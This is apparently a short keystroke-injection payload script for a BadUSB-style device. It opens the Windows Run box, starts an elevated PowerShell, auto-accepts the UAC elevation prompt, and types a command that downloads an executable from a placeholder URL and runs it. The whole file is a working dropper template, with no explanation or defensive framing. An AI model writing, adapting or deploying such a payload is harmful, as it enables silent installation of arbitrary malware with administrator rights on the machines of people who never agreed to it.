layout("US") //change the keyboard layout if needed 
delay(1000);
press("GUI r");
delay(200);
type("powershell Start-Process powershell -Verb runAs");
delay(200);
press("ENTER");
delay(2000);
press("ALT y");
delay(200);
type("$down = New-Object System.Net.WebClient; $url = 'link of the executable'; $file = 'filename.extension'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
delay(200);
press("ENTER");